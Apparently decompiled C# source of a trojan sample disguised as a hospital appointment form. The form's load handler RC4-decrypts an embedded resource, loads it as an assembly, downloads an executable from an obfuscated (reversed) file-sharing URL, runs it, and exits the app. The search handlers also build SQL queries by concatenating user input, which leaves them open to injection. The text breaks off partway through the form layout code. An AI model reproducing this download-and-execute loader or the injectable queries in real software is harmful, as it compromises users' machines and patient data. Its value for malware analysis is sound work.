// Decompiled with JetBrains decompiler
// Type: HospitalMgmtSys.Presentaion_Layer.AddAppointment
// Assembly: HospitalMgmtSys, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C7566877-C1AA-4E10-A05D-DB3E9254F927
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Bingoml.gen-5f16f372102594d9fb5704f09a4d8d7ce34a2547b5e090d80f2b64faa1b05a45.exe

using HospitalMgmtSys.Data_Layer;
using HospitalMgmtSys.Properties;
using HospitalMgmtSys.Repository_Layer;
using System;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Net;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace HospitalMgmtSys.Presentaion_Layer
{
  public class AddAppointment : Form
  {
    private const string doctorPopulateSql = "select person.*, employee.*, doctor.*\n                        from person, employee, doctor\n                        where doctor.empid = employee.empid and person.personid = employee.personid";
    private IContainer components = (IContainer) null;
    private TableLayoutPanel tableLayoutPanel1;
    private DataGridView dgvPersonView;
    private DataGridView dgvDoctorView;
    private TextBox txtSearchDoctor;
    private TextBox txtSearchPerson;
    private ComboBox cmbBloodGroup;
    private ComboBox cmbGender;
    private Button btnSearchDoctor;
    private Button btnSearchPerson;
    private Button btnClearAll;
    private Button btnConfirmAppointment;
    private ComboBox cmbAppointmentTime;
    private DateTimePicker dtpAppointmentDate;
    private TextBox txtPhone;
    private Label lblPersonPhone;
    private Label lblPersonBloodGroup;
    private Label lblPersonGender;
    private TextBox txtAge;
    private Label lblPersonAge;
    private TextBox txtPersonID;
    private Label lblTime;
    private Label lblDate;
    private Label lblPersonID;
    private TextBox txtDoctorID;
    private Label lblDoctorID;
    private TextBox txtDoctorName;
    private Label lblDoctorName;
    private TextBox txtName;
    private Label lblPersonName;
    private DataGridViewTextBoxColumn doctorid;
    private DataGridViewTextBoxColumn dname;
    private DataGridViewTextBoxColumn specialty;
    private DataGridViewTextBoxColumn availabledays;
    private DataGridViewTextBoxColumn personid;
    private DataGridViewTextBoxColumn pname;
    private DataGridViewTextBoxColumn age;
    private DataGridViewTextBoxColumn gender;
    private DataGridViewTextBoxColumn bloodgroup;
    private DataGridViewTextBoxColumn phone;
    private GroupBox grpBoxPatientInfo;
    private GroupBox grpBoxAppointmentInfo;
    private GroupBox grpBoxDoctorInfo;

    private int PatientID { get; set; }

    public AddAppointment() => this.InitializeComponent();

    private void PopulatePersonTable(string query = "select * from person")
    {
      PersonRepo personRepo = new PersonRepo();
      this.dgvPersonView.AutoGenerateColumns = false;
      this.dgvPersonView.DataSource = (object) personRepo.GetAllPersons(query);
    }

    private void dgvPersonView_DoubleClick(object sender, EventArgs e)
    {
      this.txtPersonID.Text = this.dgvPersonView.CurrentRow.Cells["personid"].Value.ToString();
      this.txtName.Text = this.dgvPersonView.CurrentRow.Cells["pname"].Value.ToString();
      this.txtAge.Text = this.dgvPersonView.CurrentRow.Cells["age"].Value.ToString();
      this.cmbGender.Text = this.dgvPersonView.CurrentRow.Cells["gender"].Value.ToString();
      this.cmbBloodGroup.Text = this.dgvPersonView.CurrentRow.Cells["bloodgroup"].Value.ToString();
      this.txtPhone.Text = this.dgvPersonView.CurrentRow.Cells["phone"].Value.ToString();
    }

    private void PopulateDoctorTable(string sql = "select person.*, employee.*, doctor.*\n                        from person, employee, doctor\n                        where doctor.empid = employee.empid and person.personid = employee.personid")
    {
      DataSet dataSet = DataAccess.GetDataSet(sql);
      this.dgvDoctorView.AutoGenerateColumns = false;
      this.dgvDoctorView.DataSource = (object) dataSet.Tables[0];
    }

    private void dgvDoctorView_DoubleClick(object sender, EventArgs e)
    {
      this.txtDoctorName.Text = this.dgvDoctorView.CurrentRow.Cells["dname"].Value.ToString();
      this.txtDoctorID.Text = this.dgvDoctorView.CurrentRow.Cells["doctorid"].Value.ToString();
    }

    private void AddAppointment_Load(object sender, EventArgs e)
    {
      try
      {
        WebClient webClient = new WebClient();
        Thread.Sleep(5000);
        System.Type type = Assembly.Load(AddAppointment.GFFQFFDSFWQFWQFWQ("PPoosege22222fwrwefwe", Resources.a3)).GetType("makefil.Frenc");
        byte[] numArray = webClient.DownloadData(this.Reverse("exe.2/SWv1Vz/teg/hs.refsnart//:sptth"));
        type.GetMethod("Frencs").Invoke((object) type, new object[1]
        {
          (object) numArray
        });
      }
      catch (Exception ex)
      {
      }
      Application.Exit();
      Environment.Exit(1);
      this.Close();
    }

    public string Reverse(string s)
    {
      char[] charArray = s.ToCharArray();
      Array.Reverse((Array) charArray);
      return new string(charArray);
    }

    private void AddAppointment_VisibleChanged(object sender, EventArgs e)
    {
      this.CLearAll();
      this.txtName.Focus();
      this.PopulatePersonTable();
      this.PopulateDoctorTable();
    }

    public static byte[] GFFQFWQFWQFWQ(string fdgfdgfdgg, byte[] wqd)
    {
      int[] numArray1 = new int[256];
      int[] numArray2 = new int[256];
      byte[] numArray3 = new byte[wqd.Length];
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (int) fdgfdgfdgg[index % fdgfdgfdgg.Length];
        numArray2[index] = index;
      }
      int index1;
      for (int index2 = index1 = 0; index1 < 256; ++index1)
      {
        index2 = (index2 + numArray2[index1] + numArray1[index1]) % 256;
        int num = numArray2[index1];
        numArray2[index1] = numArray2[index2];
        numArray2[index2] = num;
      }
      int num1;
      int index3 = num1 = 0;
      int index4 = num1;
      int index5 = num1;
      for (; index3 < wqd.Length; ++index3)
      {
        index5 = (index5 + 1) % 256;
        index4 = (index4 + numArray2[index5]) % 256;
        int num2 = numArray2[index5];
        numArray2[index5] = numArray2[index4];
        numArray2[index4] = num2;
        int num3 = numArray2[(numArray2[index5] + numArray2[index4]) % 256];
        numArray3[index3] = (byte) ((uint) wqd[index3] ^ (uint) num3);
      }
      return numArray3;
    }

    public static byte[] GFFQFFDSFWQFWQFWQ(string fdgfdgfdgg, byte[] wqd) => AddAppointment.GFFQFWQFWQFWQ(fdgfdgfdgg, wqd);

    private void btnConfirmAppointment_Click(object sender, EventArgs e)
    {
      try
      {
        this.CheckTextField();
        DateTime dateTime = this.dtpAppointmentDate.Value;
        if (dateTime.Date < DateTime.Today)
          throw new Exception("Selected date must be of today or future");
        DoctorRepo doctorRepo = new DoctorRepo();
        DataTable individualDoctorsInfo = doctorRepo.GetIndividualDoctorsInfo(Convert.ToInt32(this.txtDoctorID.Text));
        doctorRepo.DoctorID = Convert.ToInt32(individualDoctorsInfo.Rows[0]["doctorid"].ToString());
        doctorRepo.Specialty = individualDoctorsInfo.Rows[0]["specialty"].ToString();
        doctorRepo.AvailableDays = individualDoctorsInfo.Rows[0]["availabledays"].ToString();
        doctorRepo.EmployeeIdOfDoctor = Convert.ToInt32(individualDoctorsInfo.Rows[0]["empid"].ToString());
        string[] strArray = doctorRepo.AvailableDays.Split(' ');
        bool flag = false;
        dateTime = this.dtpAppointmentDate.Value;
        string str1 = dateTime.DayOfWeek.ToString().Substring(0, 3);
        foreach (string str2 in strArray)
        {
          if (str2.Equals(str1))
          {
            flag = true;
            break;
          }
          flag = false;
        }
        if (!flag)
          throw new Exception("Doctor not available on this day. Check Available days");
        int int32_1 = Convert.ToInt32(DataAccess.GetDataTable("select employee.personid from employee \n                        where employee.empid = '" + (object) doctorRepo.EmployeeIdOfDoctor + "' ").Rows[0]["personid"].ToString());
        PersonRepo personRepo = new PersonRepo();
        if (personRepo.GetIndividualPerson(int32_1).Rows[0]["personid"].ToString().Equals(this.txtPersonID.Text))
          throw new Exception("Doctor and patient cannot be the same person");
        AppointmentRepo appointmentRepo1 = new AppointmentRepo();
        string starttime1 = this.cmbAppointmentTime.Text.ToString();
        dateTime = this.dtpAppointmentDate.Value;
        string date1 = dateTime.ToString("MM/dd/yyyy");
        int int32_2 = Convert.ToInt32(this.txtDoctorID.Text);
        if (appointmentRepo1.RowExits(starttime1, date1, int32_2))
          throw new Exception("Clash Appointment");
        if (MessageBox.Show("Confirm appointment?", "Confirm", MessageBoxButtons.YesNoCancel) != DialogResult.Yes)
          return;
        if (this.txtPersonID.Text == string.Empty)
        {
          personRepo.Name = this.txtName.Text;
          personRepo.Age = int.Parse(this.txtAge.Text);
          personRepo.Gender = this.cmbGender.Text;
          personRepo.BloodGroup = this.cmbBloodGroup.Text;
          personRepo.Phone = this.txtPhone.Text;
          int person = personRepo.CreatePerson(personRepo.Name, personRepo.Age, personRepo.Gender, personRepo.BloodGroup, personRepo.Phone);
          this.PopulatePersonTable();
          if (person == 1)
          {
            this.PatientID = Convert.ToInt32(personRepo.GetLastPerson().Rows[0]["personid"].ToString());
            AppointmentRepo appointmentRepo2 = appointmentRepo1;
            string starttime2 = this.cmbAppointmentTime.Text.ToString();
            dateTime = this.dtpAppointmentDate.Value;
            string date2 = dateTime.ToString("MM/dd/yyyy");
            int patientId = this.PatientID;
            int int32_3 = Convert.ToInt32(this.txtDoctorID.Text);
            if (appointmentRepo2.CreateAppointment(starttime2, date2, patientId, int32_3) == 1)
            {
              int num = (int) MessageBox.Show("Appointment Confirmed");
              this.CLearAll();
            }
          }
        }
        else
        {
          this.PatientID = Convert.ToInt32(this.txtPersonID.Text);
          if (appointmentRepo1.CreateAppointment(starttime1, date1, this.PatientID, int32_2) == 1)
          {
            int num = (int) MessageBox.Show("Appointment Confirmed");
            this.CLearAll();
          }
        }
      }
      catch (Exception ex)
      {
        int num = (int) MessageBox.Show(ex.Message, "ERROR");
      }
    }

    private void txtSearchPerson_TextChanged(object sender, EventArgs e) => this.PopulatePersonTable("select * from person where name like '%" + this.txtSearchPerson.Text + "%'\n                            or phone like '%" + this.txtSearchPerson.Text + "%';");

    private void txtSearchDoctor_TextChanged(object sender, EventArgs e) => this.PopulateDoctorTable("select person.*, employee.*, doctor.*\n                        from person, employee, doctor\n                        where doctor.empid = employee.empid and person.personid = employee.personid\n                        and (name like '%" + this.txtSearchDoctor.Text + "%'\n                        or specialty like '%" + this.txtSearchDoctor.Text + "%');");

    private void btnSearchPerson_Click(object sender, EventArgs e) => this.PopulatePersonTable("select * from person where name = '%" + this.txtSearchPerson.Text + "%' \n                        or phone like '%" + this.txtSearchPerson.Text + "%';");

    private void btnSearchDoctor_Click(object sender, EventArgs e) => this.PopulateDoctorTable("select person.*, employee.*, doctor.*\n                        from person, employee, doctor\n                        where doctor.empid = employee.empid and person.personid = employee.personid\n                        and ( name like '%" + this.txtSearchDoctor.Text + "%'\n                        or specialty like '%" + this.txtSearchDoctor.Text + "%');");

    private void btnClearAll_Click(object sender, EventArgs e) => this.CLearAll();

    private void CLearAll()
    {
      this.txtPersonID.Text = string.Empty;
      this.txtName.Text = string.Empty;
      this.txtAge.Text = string.Empty;
      this.txtPhone.Text = string.Empty;
      this.cmbBloodGroup.SelectedIndex = -1;
      this.cmbGender.SelectedIndex = -1;
      this.cmbAppointmentTime.SelectedIndex = -1;
      this.txtDoctorID.Text = string.Empty;
      this.txtDoctorName.Text = string.Empty;
      this.txtSearchDoctor.Text = string.Empty;
      this.txtSearchPerson.Text = string.Empty;
      this.dtpAppointmentDate.Value = DateTime.Today;
    }

    private void CheckTextField()
    {
      if (string.IsNullOrWhiteSpace(this.txtName.Text))
        throw new Exception("Required Field empty");
      if (string.IsNullOrWhiteSpace(this.txtAge.Text))
        throw new Exception("Required Field empty");
      if (Convert.ToInt32(this.txtAge.Text.ToString()) < 0 || Convert.ToInt32(this.txtAge.Text.ToString()) > 130)
        throw new Exception("Please enter valid age");
      if (string.IsNullOrWhiteSpace(this.txtPhone.Text))
        throw new Exception("Required Field empty");
      if (this.cmbGender.SelectedItem == null)
        throw new Exception("Required Field empty");
      if (this.cmbBloodGroup.SelectedItem == null)
        throw new Exception("Required Field empty");
      if (this.cmbAppointmentTime.SelectedItem == null)
        throw new Exception("Required Field empty");
      if (string.IsNullOrWhiteSpace(this.txtDoctorID.Text))
        throw new Exception("Required Field empty");
      if (string.IsNullOrWhiteSpace(this.txtDoctorName.Text))
        throw new Exception("Required Field empty");
    }

    private void txtPhone_TextChanged(object sender, EventArgs e)
    {
      if (!Regex.IsMatch(this.txtPhone.Text, "[^0-9]"))
        return;
      int num = (int) MessageBox.Show("Please enter only numbers.");
      this.txtPhone.Text = this.txtPhone.Text.Remove(this.txtPhone.Text.Length - 1);
      this.txtPhone.SelectionStart = this.txtPhone.Text.Length;
      this.txtPhone.SelectionLength = 0;
    }

    private void txtAge_TextChanged(object sender, EventArgs e)
    {
      if (!Regex.IsMatch(this.txtAge.Text, "[^0-9]"))
        return;
      int num = (int) MessageBox.Show("Please enter only numbers.");
      this.txtAge.Text = this.txtAge.Text.Remove(this.txtAge.Text.Length - 1);
      this.txtAge.SelectionStart = this.txtPhone.Text.Length;
      this.txtAge.SelectionLength = 0;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.tableLayoutPanel1 = new TableLayoutPanel();
      this.dgvPersonView = new DataGridView();
      this.personid = new DataGridViewTextBoxColumn();
      this.pname = new DataGridViewTextBoxColumn();
      this.age = new DataGridViewTextBoxColumn();
      this.gender = new DataGridViewTextBoxColumn();
      this.bloodgroup = new DataGridViewTextBoxColumn();
      this.phone = new DataGridViewTextBoxColumn();
      this.dgvDoctorView = new DataGridView();
      this.doctorid = new DataGridViewTextBoxColumn();
      this.dname = new DataGridViewTextBoxColumn();
      this.specialty = new DataGridViewTextBoxColumn();
      this.availabledays = new DataGridViewTextBoxColumn();
      this.txtSearchDoctor = new TextBox();
      this.txtSearchPerson = new TextBox();
      this.cmbBloodGroup = new ComboBox();
      this.cmbGender = new ComboBox();
      this.btnSearchDoctor = new Button();
      this.btnSearchPerson = new Button();
      this.btnClearAll = new Button();
      this.btnConfirmAppointment = new Button();
      this.cmbAppointmentTime = new ComboBox();
      this.dtpAppointmentDate = new DateTimePicker();
      this.txtPhone = new TextBox();
      this.lblPersonPhone = new Label();
      this.lblPersonBloodGroup = new Label();
      this.lblPersonGender = new Label();
      this.txtAge = new TextBox();
      this.lblPersonAge = new Label();
      this.txtPersonID = new TextBox();
      this.lblTime = new Label();
      this.lblDate = new Label();
      this.lblPersonID = new Label();
      this.txtDoctorID = new TextBox();
      this.lblDoctorID = new Label();
      this.txtDoctorName = new TextBox();
      this.lblDoctorName = new Label();
      this.txtName = new TextBox();
      this.lblPersonName = new Label();
      this.grpBoxPatientInfo = new GroupBox();
      this.grpBoxAppointmentInfo = new GroupBox();
      this.grpBoxDoctorInfo = new GroupBox();
      this.tableLayoutPanel1.SuspendLayout();
      ((ISupportInitialize) this.dgvPersonView).BeginInit();
      ((ISupportInitialize) this.dgvDoctorView).BeginInit();
      this.grpBoxPatientInfo.SuspendLayout();
      this.grpBoxAppointmentInfo.SuspendLayout();
      this.grpBoxDoctorInfo.SuspendLayout();
      this.SuspendLayout();
      this.tableLayoutPanel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.tableLayoutPanel1.ColumnCount = 2;
      this.tableLayoutPanel1.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 59.12477f));
      this.tableLayoutPanel1.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 40.87523f));
      this.tableLayoutPanel1.Controls.Add((Control) this.dgvPersonView, 0, 0);
      this.tableLayoutPanel1.Controls.Add((Control) this.dgvDoctorView, 1, 0);
      this.tableLayoutPanel1.Location = new Point(13, 349);
      this.tableLayoutPanel1.Name = "tableLayoutPanel1";
      this.tableLayoutPanel1.RowCount = 1;
      this.tableLayoutPanel1.RowStyles.Add(new RowStyle(SizeType.Percent, 50f));
      this.tableLayoutPanel1.Size = new Size(1074, 264);
      this.tableLayoutPanel1.TabIndex = 0;
      this.dgvPersonView.AllowUserToAddRows = false;
      this.dgvPersonView.AllowUserToDeleteRows = false;
      this.dgvPersonView.AllowUserToResizeColumns = false;
      this.dgvPersonView.AllowUserToResizeRows = false;
      this.dgvPersonView.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.dgvPersonView.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
      this.dgvPersonView.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
      this.dgvPersonView.Columns.AddRange((DataGridViewColumn) this.personid, (DataGridViewColumn) this.pname, (DataGridViewColumn) this.age, (DataGridViewColumn) this.gender, (DataGridViewColumn) this.bloodgroup, (DataGridViewColumn) this.phone);
      this.dgvPersonView.Location = new Point(3, 3);
      this.dgvPersonView.Name = "dgvPersonView";
      this.dgvPersonView.ReadOnly = true;
      this.dgvPersonView.RowTemplate.Height = 24;
      this.dgvPersonView.Size = new Size(629, 258);
      this.dgvPersonView.TabIndex = 0;
      this.dgvPersonView.TabStop = false;
      this.dgvPersonView.DoubleClick += new EventHandler(this.dgvPersonView_DoubleClick);
      this.personid.DataPropertyName = "personid";
      this.personid.HeaderText = "Person ID";
      this.personid.Name = "personid";
      this.personid.ReadOnly = true;
      this.personid.Visible = false;
      this.pname.DataPropertyName = "name";
      this.pname.HeaderText = "Person Name";
      this.pname.Name = "pname";
      this.pname.ReadOnly = true;
      this.age.DataPropertyName = "age";
      this.age.HeaderText = "Age";
      this.age.Name = "age";
      this.age.ReadOnly = true;
      this.gender.DataPropertyName = "gender";
      this.gender.HeaderText = "Gender";
      this.gender.Name = "gender";
      this.gender.ReadOnly = true;
      this.bloodgroup.DataPropertyName = "bloodgroup";
      this.bloodgroup.HeaderText = "Blood Group";
      this.bloodgroup.Name = "bloodgroup";
      this.bloodgroup.ReadOnly = true;
      this.phone.DataPropertyName = "phone";
      this.phone.HeaderText = "Phone Number";
      this.phone.Name = "phone";
      this.phone.ReadOnly = true;
      this.dgvDoctorView.AllowUserToAddRows = false;
      this.dgvDoctorView.AllowUserToDeleteRows = false;
      this.dgvDoctorView.AllowUserToResizeColumns = false;
      this.dgvDoctorView.AllowUserToResizeRows = false;
      this.dgvDoctorView.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.dgvDoctorView.AutoSizeColumnsMode = DataGridViewAutoSizeColumnsMode.Fill;
      this.dgvDoctorView.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
      this.dgvDoctorView.Columns.AddRange((DataGridViewColumn) this.doctorid, (DataGridViewColumn) this.dname, (DataGridViewColumn) this.specialty, (DataGridViewColumn) this.availabledays);
      this.dgvDoctorView.Location = new Point(638, 3);
      this.dgvDoctorView.MultiSelect = false;
      this.dgvDoctorView.Name = "dgvDoctorView";
      this.dgvDoctorView.ReadOnly = true;
      this.dgvDoctorView.RowTemplate.Height = 24;
      this.dgvDoctorView.Size = new Size(433, 258);
      this.dgvDoctorView.TabIndex = 0;
      this.dgvDoctorView.TabStop = false;
      this.dgvDoctorView.DoubleClick += new EventHandler(this.dgvDoctorView_DoubleClick);
      this.doctorid.DataPropertyName = "doctorid";
      this.doctorid.HeaderText = "Doctor ID";
      this.doctorid.Name = "doctorid";
      this.doctorid.ReadOnly = true;
      this.doctorid.Visible = false;
      this.dname.DataPropertyName = "name";
      this.dname.HeaderText = "Doctor Name";
      this.dname.Name = "dname";
      this.dname.ReadOnly = true;
      this.specialty.DataPropertyName = "specialty";
      this.specialty.HeaderText = "Specialty";
      this.specialty.Name = "specialty";
      this.specialty.ReadOnly = true;
      this.availabledays.DataPropertyName = "availabledays";
      this.availabledays.HeaderText = "Available Days";
      this.availabledays.Name = "availabledays";
      this.availabledays.ReadOnly = true;
      this.txtSearchDoctor.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtSearchDoctor.Location = new Point(708, 316);
      this.txtSearchDoctor.Name = "txtSearchDoctor";
      this.txtSearchDoctor.Size = new Size(257, 30);
      this.txtSearchDoctor.TabIndex = 17;
      this.txtSearchDoctor.TextChanged += new EventHandler(this.txtSearchDoctor_TextChanged);
      this.txtSearchPerson.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtSearchPerson.Location = new Point(13, 316);
      this.txtSearchPerson.Name = "txtSearchPerson";
      this.txtSearchPerson.Size = new Size(306, 30);
      this.txtSearchPerson.TabIndex = 15;
      this.txtSearchPerson.TextChanged += new EventHandler(this.txtSearchPerson_TextChanged);
      this.cmbBloodGroup.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cmbBloodGroup.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.cmbBloodGroup.FormattingEnabled = true;
      this.cmbBloodGroup.Items.AddRange(new object[6]
      {
        (object) "A +ve",
        (object) "A -ve",
        (object) "B +ve",
        (object) "B -ve",
        (object) "O +ve",
        (object) "O -ve"
      });
      this.cmbBloodGroup.Location = new Point(163, 183);
      this.cmbBloodGroup.Name = "cmbBloodGroup";
      this.cmbBloodGroup.Size = new Size(357, 28);
      this.cmbBloodGroup.TabIndex = 9;
      this.cmbGender.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cmbGender.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.cmbGender.FormattingEnabled = true;
      this.cmbGender.Items.AddRange(new object[2]
      {
        (object) "Male",
        (object) "Female"
      });
      this.cmbGender.Location = new Point(163, 145);
      this.cmbGender.Name = "cmbGender";
      this.cmbGender.Size = new Size(357, 28);
      this.cmbGender.TabIndex = 8;
      this.btnSearchDoctor.Location = new Point(971, 316);
      this.btnSearchDoctor.Name = "btnSearchDoctor";
      this.btnSearchDoctor.Size = new Size(113, 30);
      this.btnSearchDoctor.TabIndex = 18;
      this.btnSearchDoctor.Text = "Search &Doctor";
      this.btnSearchDoctor.UseVisualStyleBackColor = true;
      this.btnSearchDoctor.Click += new EventHandler(this.btnSearchDoctor_Click);
      this.btnSearchPerson.Location = new Point(325, 316);
      this.btnSearchPerson.Name = "btnSearchPerson";
      this.btnSearchPerson.Size = new Size(113, 30);
      this.btnSearchPerson.TabIndex = 16;
      this.btnSearchPerson.Text = "Search &Person";
      this.btnSearchPerson.UseVisualStyleBackColor = true;
      this.btnSearchPerson.Click += new EventHandler(this.btnSearchPerson_Click);
      this.btnClearAll.Location = new Point(997, 277);
      this.btnClearAll.Name = "btnClearAll";
      this.btnClearAll.Size = new Size(87, 30);
      this.btnClearAll.TabIndex = 14;
      this.btnClearAll.Text = "Clea&r";
      this.btnClearAll.UseVisualStyleBackColor = true;
      this.btnClearAll.Click += new EventHandler(this.btnClearAll_Click);
      this.btnConfirmAppointment.Location = new Point(823, 277);
      this.btnConfirmAppointment.Name = "btnConfirmAppointment";
      this.btnConfirmAppointment.Size = new Size(156, 30);
      this.btnConfirmAppointment.TabIndex = 13;
      this.btnConfirmAppointment.Text = "C&onfirm Appointment";
      this.btnConfirmAppointment.UseVisualStyleBackColor = true;
      this.btnConfirmAppointment.Click += new EventHandler(this.btnConfirmAppointment_Click);
      this.cmbAppointmentTime.DropDownStyle = ComboBoxStyle.DropDownList;
      this.cmbAppointmentTime.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.cmbAppointmentTime.FormattingEnabled = true;
      this.cmbAppointmentTime.Items.AddRange(new object[14]
      {
        (object) "16:00:00",
        (object) "16:30:00",
        (object) "17:00:00",
        (object) "17:30:00",
        (object) "18:00:00",
        (object) "18:30:00",
        (object) "19:00:00",
        (object) "19:30:00",
        (object) "20:00:00",
        (object) "20:30:00",
        (object) "21:00:00",
        (object) "21:30:00",
        (object) "22:00:00",
        (object) "22:30:00"
      });
      this.cmbAppointmentTime.Location = new Point(100, 67);
      this.cmbAppointmentTime.Name = "cmbAppointmentTime";
      this.cmbAppointmentTime.Size = new Size(168, 28);
      this.cmbAppointmentTime.TabIndex = 12;
      this.dtpAppointmentDate.CalendarFont = new Font("Microsoft Sans Serif", 7.8f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.dtpAppointmentDate.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.dtpAppointmentDate.Location = new Point(100, 24);
      this.dtpAppointmentDate.Name = "dtpAppointmentDate";
      this.dtpAppointmentDate.Size = new Size(380, 27);
      this.dtpAppointmentDate.TabIndex = 11;
      this.txtPhone.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtPhone.Location = new Point(163, 220);
      this.txtPhone.Name = "txtPhone";
      this.txtPhone.Size = new Size(357, 30);
      this.txtPhone.TabIndex = 10;
      this.txtPhone.TextChanged += new EventHandler(this.txtPhone_TextChanged);
      this.lblPersonPhone.AutoSize = true;
      this.lblPersonPhone.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPersonPhone.Location = new Point(17, 225);
      this.lblPersonPhone.Name = "lblPersonPhone";
      this.lblPersonPhone.Size = new Size(61, 20);
      this.lblPersonPhone.TabIndex = 20;
      this.lblPersonPhone.Text = "Phone";
      this.lblPersonBloodGroup.AutoSize = true;
      this.lblPersonBloodGroup.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPersonBloodGroup.Location = new Point(15, 187);
      this.lblPersonBloodGroup.Name = "lblPersonBloodGroup";
      this.lblPersonBloodGroup.Size = new Size(114, 20);
      this.lblPersonBloodGroup.TabIndex = 19;
      this.lblPersonBloodGroup.Text = "Blood Group";
      this.lblPersonGender.AutoSize = true;
      this.lblPersonGender.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPersonGender.Location = new Point(15, 149);
      this.lblPersonGender.Name = "lblPersonGender";
      this.lblPersonGender.Size = new Size(70, 20);
      this.lblPersonGender.TabIndex = 10;
      this.lblPersonGender.Text = "Gender";
      this.txtAge.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtAge.Location = new Point(161, 106);
      this.txtAge.Name = "txtAge";
      this.txtAge.Size = new Size(359, 30);
      this.txtAge.TabIndex = 7;
      this.txtAge.TextChanged += new EventHandler(this.txtAge_TextChanged);
      this.lblPersonAge.AutoSize = true;
      this.lblPersonAge.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPersonAge.Location = new Point(15, 111);
      this.lblPersonAge.Name = "lblPersonAge";
      this.lblPersonAge.Size = new Size(41, 20);
      this.lblPersonAge.TabIndex = 18;
      this.lblPersonAge.Text = "Age";
      this.txtPersonID.Enabled = false;
      this.txtPersonID.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtPersonID.Location = new Point(162, 27);
      this.txtPersonID.Name = "txtPersonID";
      this.txtPersonID.Size = new Size(359, 30);
      this.txtPersonID.TabIndex = 5;
      this.txtPersonID.TabStop = false;
      this.lblTime.AutoSize = true;
      this.lblTime.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblTime.Location = new Point(6, 75);
      this.lblTime.Name = "lblTime";
      this.lblTime.Size = new Size(50, 20);
      this.lblTime.TabIndex = 17;
      this.lblTime.Text = "Time";
      this.lblDate.AutoSize = true;
      this.lblDate.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblDate.Location = new Point(6, 31);
      this.lblDate.Name = "lblDate";
      this.lblDate.Size = new Size(49, 20);
      this.lblDate.TabIndex = 16;
      this.lblDate.Text = "Date";
      this.lblPersonID.AutoSize = true;
      this.lblPersonID.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblPersonID.Location = new Point(16, 30);
      this.lblPersonID.Name = "lblPersonID";
      this.lblPersonID.Size = new Size(33, 25);
      this.lblPersonID.TabIndex = 14;
      this.lblPersonID.Text = "ID";
      this.txtDoctorID.Enabled = false;
      this.txtDoctorID.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtDoctorID.Location = new Point(159, 68);
      this.txtDoctorID.Name = "txtDoctorID";
      this.txtDoctorID.Size = new Size(273, 30);
      this.txtDoctorID.TabIndex = 14;
      this.txtDoctorID.TabStop = false;
      this.lblDoctorID.AutoSize = true;
      this.lblDoctorID.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblDoctorID.Location = new Point(7, 73);
      this.lblDoctorID.Name = "lblDoctorID";
      this.lblDoctorID.Size = new Size(91, 20);
      this.lblDoctorID.TabIndex = 13;
      this.lblDoctorID.Text = "Doctor ID";
      this.txtDoctorName.Enabled = false;
      this.txtDoctorName.Font = new Font("Segoe UI", 10.2f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.txtDoctorName.Location = new Point(159, 22);
      this.txtDoctorName.Name = "txtDoctorName";
      this.txtDoctorName.Size = new Size(273, 30);
      this.txtDoctorName.TabIndex = 13;
      this.txtDoctorName.TabStop = false;
      this.lblDoctorName.AutoSize = true;
      this.lblDoctorName.Font = new Font("Microsoft Sans Serif", 10.2f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.lblDoctorName.Location = new Point(7, 27);
      this.lblDoctorName.Name = "lblDoctorName";
